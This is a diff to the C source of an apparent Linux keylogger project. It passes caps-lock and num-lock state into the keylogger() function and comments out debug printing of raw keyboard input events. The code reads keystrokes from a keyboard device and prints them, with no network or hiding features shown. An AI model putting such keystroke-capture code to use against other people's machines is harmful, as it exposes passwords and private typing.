@@ -13,6 +13,8 @@
 #include <signal.h>
 #include <stdio.h>
 #include <unistd.h>
+#include <sys/ioctl.h>
+#include <linux/kd.h>
 
 #include "keylogger.h"
 #include "keys.h"
@@ -49,49 +51,47 @@ static int  		print_keysym(int code)
 	return printf("%#04x", code);
 }
 
-void					keylogger(int keybd, int **key_table)
+void					keylogger(int keybd, int **key_table, int capslock, int numlock)
 {
 	int					nbread;
 	struct input_event	events[128];
-	int 				modifier = 0; // Ctrl, Shift, Alt keys
-	int 				value = 0; // which key have been pressed
-	int 				state = 0; // state 0: released 1:pressed 2:repeated
-	int 				capslock = 0;
-	int 				numlock = 0;
+	int 				modifier = 0;	// Ctrl, Shift, Alt keys
+	int 				value;			// which key have been pressed
+	int 				state;			// state 0: released 1:pressed 2:repeated
 
 	signal(SIGINT, sigint);
 	loop = 1;
 	while (loop)
 	{
-		printf("CAPSLOCK %s\n", (capslock) ? "ON" : "OFF");
-		printf("NUMLOCK %s\n", (numlock) ? "ON" : "OFF");
+		// printf("CAPSLOCK %s\n", (capslock) ? "ON" : "OFF");
+		// printf("NUMLOCK %s\n", (numlock) ? "ON" : "OFF");
 		value = state = 0;
 		nbread = read(keybd, events, sizeof(struct input_event) * 128);
-		printf("---------------------------------------------------------\n");
+		// printf("---------------------------------------------------------\n");
 		for (size_t i = 0; i < nbread / sizeof(struct input_event); i++)
 		{
 			if (events[i].type == EV_KEY) {
 				value = events[i].code;
 				state = events[i].value;
 			}
-			printf("[%s] ", event[events[i].type].name);
-			if (events[i].type == EV_KEY) {
-				printf("%s ", key[events[i].code].name);
-				printf("%s ", (events[i].value == 0) ? "OFF" : (events[i].value == 1) ? "ON" : " REPEAT");
-			}
-			else if (events[i].type == EV_MSC) {
-				printf("%s ", msc[events[i].code].name);
-				printf("%d ", events[i].value);
-			}
-			else if (events[i].type == EV_LED) {
-				printf("%s ", led[events[i].code].name);
-				printf("%d ", events[i].value);
-			}
-			else {
-				printf("%d ", events[i].code);
-				printf("%d ", events[i].value);
-			}
-			printf("\n");
+			// printf("[%s] ", event[events[i].type].name);
+			// if (events[i].type == EV_KEY) {
+			// 	printf("%s ", key[events[i].code].name);
+			// 	printf("%s ", (events[i].value == 0) ? "OFF" : (events[i].value == 1) ? "ON" : " REPEAT");
+			// }
+			// else if (events[i].type == EV_MSC) {
+			// 	printf("%s ", msc[events[i].code].name);
+			// 	printf("%d ", events[i].value);
+			// }
+			// else if (events[i].type == EV_LED) {
+			// 	printf("%s ", led[events[i].code].name);
+			// 	printf("%d ", events[i].value);
+			// }
+			// else {
+			// 	printf("%d ", events[i].code);
+			// 	printf("%d ", events[i].value);
+			// }
+			// printf("\n");
 		}
 
 		if (value == KEY_CAPSLOCK) {
@@ -143,6 +143,6 @@ void					keylogger(int keybd, int **key_table)
 			print_keysym(key_table[value][modifier]);
 			fflush(stdout);
 		}
-		printf("---------------------------------------------------------\n");
+		// printf("---------------------------------------------------------\n");
 	}
 }
